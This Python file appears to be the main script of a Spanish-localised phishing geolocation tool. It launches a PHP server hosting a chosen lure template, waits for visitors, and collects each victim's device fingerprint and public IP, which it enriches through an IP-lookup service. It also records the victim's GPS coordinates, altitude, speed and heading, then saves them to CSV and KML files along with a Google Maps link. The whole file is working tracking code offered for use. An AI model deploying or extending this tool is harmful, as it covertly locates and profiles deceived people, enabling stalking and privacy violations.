VERSION = '1.2.8'

R = '\033[36m'  # red
G = '\033[34m'  # green
C = '\033[38m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow

import sys
import argparse
import requests
import traceback
from os import path, kill, mkdir
from json import loads, decoder
from packaging import version

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')

args = parser.parse_args()
kml_fname = args.kml
port = args.port
print_v = args.version

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'

import importlib
from csv import writer
from time import sleep
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM

def template_select(site):
	print(f'{Y}[!] Selecciona el modelo:{W}\n')

	with open(TEMPLATES_JSON, 'r') as templ:
		templ_info = templ.read()

	templ_json = loads(templ_info)

	for item in templ_json['templates']:
		name = item['name']
		print(f'{G}[{templ_json["templates"].index(item)}] {C}{name}{W}')

	try:
		selected = int(input(f'{G}[>] {W}'))
		if selected < 0:
			print()
			print(f'{R}[-] {C}Entrada invalida{W}')
			sys.exit()
	except ValueError:
		print()
		print(f'{R}[-] {C}Entrada invalida{W}')
		sys.exit()

	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print()
		print(f'{R}[-] {C}Entrada invalida{W}')
		sys.exit()

	print()
	print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')

	module = templ_json['templates'][selected]['module']
	if module is True:
		imp_file = templ_json['templates'][selected]['import_file']
		importlib.import_module(f'template.{imp_file}')
	else:
		pass
	return site


def server():
	print()
	preoc = False
	print(f'{G}[+] {C}Puerto: {W}{port}\n')
	print(f'{G}[+] {C}Iniciando el servidor PHP...{W}', end='', flush=True)
	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']

	with open(LOG_FILE, 'w+') as phplog:
		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
		sleep(3)
		phplog.seek(0)
		if 'Direccion esta lista para usar' in phplog.readline():
			preoc = True
		try:
			php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
			php_sc = php_rqst.status_code
			if php_sc == 200:
				if preoc:
					print(f'{C}[ {G}✔{C} ]{W}')
					print(f'{Y}[!] El servidor se ha iniciado{W}')
					print()
				else:
					print(f'{C}[ {G}✔{C} ]{W}')
					print()
			else:
				print(f'{C}[ {R}Estado: {php_sc}{C} ]{W}')
				cl_quit(proc)
		except requests.ConnectionError:
			print(f'{C}[ {R}✘{C} ]{W}')
			cl_quit(proc)
	return proc


def wait():
	printed = False
	while True:
		sleep(2)
		size = path.getsize(RESULT)
		if size == 0 and printed is False:
			print(f'{G}[+] {C}Esperando al cliente....{Y}[CTRL+C Para salir]{W}\n')
			printed = True
		if size > 0:
			data_parser()
			printed = False


def data_parser():
	data_row = []
	with open(INFO, 'r') as info_file:
		info_file = info_file.read()
	try:
		info_json = loads(info_file)
	except decoder.JSONDecodeError:
		print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
	else:
		var_os = info_json['os']
		var_platform = info_json['platform']
		var_cores = info_json['cores']
		var_ram = info_json['ram']
		var_vendor = info_json['vendor']
		var_render = info_json['render']
		var_res = info_json['wd'] + 'x' + info_json['ht']
		var_browser = info_json['browser']
		var_ip = info_json['ip']

		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])

		print(f'''{Y}[!] Informacion del dispositivo :{W}

{G}[+] {C}OS         : {W}{var_os}
{G}[+] {C}Plataforma   : {W}{var_platform}
{G}[+] {C}Nucleos del CPU : {W}{var_cores}
{G}[+] {C}RAM        : {W}{var_ram}
{G}[+] {C}Vendedora del GPU : {W}{var_vendor}
{G}[+] {C}GPU        : {W}{var_render}
{G}[+] {C}Rosolucion : {W}{var_res}
{G}[+] {C}Navegador    : {W}{var_browser}
{G}[+] {C}IP publilca  : {W}{var_ip}
''')

		if ip_address(var_ip).is_private:
			print(f'{Y}[!] Saltarse el reconocimiento de IP porque la dirección IP es privada{W}')
		else:
			rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
			s_code = rqst.status_code

			if s_code == 200:
				data = rqst.text
				data = loads(data)
				var_continent = str(data['continent'])
				var_country = str(data['country'])
				var_region = str(data['region'])
				var_city = str(data['city'])
				var_org = str(data['org'])
				var_isp = str(data['isp'])

				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])

				print(f'''{Y}[!] Informacion de la IP :{W}

{G}[+] {C}Continente : {W}{var_continent}
{G}[+] {C}Pais   : {W}{var_country}
{G}[+] {C}Region    : {W}{var_region}
{G}[+] {C}Ciudad      : {W}{var_city}
{G}[+] {C}Org       : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
''')

	with open(RESULT, 'r') as result_file:
		results = result_file.read()
		try:
			result_json = loads(results)
		except decoder.JSONDecodeError:
			print(f'{R}[-] {C}Excepcion : {R}{traceback.format_exc()}{W}')
		else:
			status = result_json['status']
			if status == 'success':
				var_lat = result_json['lat']
				var_lon = result_json['lon']
				var_acc = result_json['acc']
				var_alt = result_json['alt']
				var_dir = result_json['dir']
				var_spd = result_json['spd']

				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])

				print(f'''{Y}[!] Informacion de localizacion :{W}

{G}[+] {C}Latitud  : {W}{var_lat}
{G}[+] {C}Logintud : {W}{var_lon}
{G}[+] {C}Precision  : {W}{var_acc}
{G}[+] {C}Altitud  : {W}{var_alt}
{G}[+] {C}Direccion : {W}{var_dir}
{G}[+] {C}Velocidad     : {W}{var_spd}
''')

				print(f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}')

				if kml_fname is not None:
					kmlout(var_lat, var_lon)

	csvout(data_row)
	clear()
	return


def kmlout(var_lat, var_lon):
	with open(TEMP_KML, 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(f'{Y}[!] Archivo Generado{W}')
	print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')


def csvout(row):
	with open(DATA_FILE, 'a') as csvfile:
		csvwriter = writer(csvfile)
		csvwriter.writerow(row)
	print(f'{G}[+] {C}Datos Guardados : {W}{path_to_script}/db/results.csv\n')


def clear():
	with open(RESULT, 'w+'):
		pass
	with open(INFO, 'w+'):
		pass


def repeat():
	clear()
	wait()


def cl_quit(proc):
	clear()
	if proc:
		kill(proc.pid, SIGTERM)
	sys.exit()


try:
	clear()
	SITE = template_select(SITE)
	SERVER_PROC = server()
	wait()
	data_parser()
except KeyboardInterrupt:
	print(f'{R}[-] {C}Herramienta detenida.{W}')
	cl_quit(SERVER_PROC)
else:
	repeat()
